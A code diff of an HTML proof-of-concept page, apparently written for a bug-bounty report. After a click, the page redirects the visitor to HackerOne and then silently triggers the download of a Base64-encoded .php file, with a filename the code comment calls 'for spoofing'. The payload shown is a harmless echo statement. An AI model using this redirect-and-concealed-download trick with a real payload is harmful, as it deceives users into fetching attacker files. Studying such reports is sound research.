@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Concealed PHP Download</title>
+  <title>Concealed Download</title>
   <style>
     body {
       height: 100vh;
@@ -24,7 +24,7 @@
 
 <h1>
   Tap anywhere.<br>
-  You will be redirected to HackerOne first, then the PHP file will be downloaded.
+  You will be redirected to HackerOne first, then the file will be downloaded.
 </h1>
 
 <script>
@@ -34,8 +34,8 @@ document.addEventListener('click', () => {
 
   // Step 2: After 3 seconds, trigger file download
   setTimeout(() => {
-    // Create PHP content with embedded URL ("from: google.com")
-    const payload = '<?php echo "This file is from: google.com"; ?>';
+    // Create file content with URL hidden inside
+    const payload = '<?php echo "This file is from: https://google.com"; ?>';
 
     // Encode the PHP content to Base64
     const encodedPayload = btoa(payload);
@@ -46,7 +46,7 @@ document.addEventListener('click', () => {
     // Create an <a> tag to trigger the download
     const a = document.createElement('a');
     a.href = dataUri;
-    a.download = 'document.php_________________from https://google.com'; // Suggested filename (.php file)
+    a.download = 'document.php'; // Filename .php for spoofing
     document.body.appendChild(a);
     a.click(); // Trigger the download
 
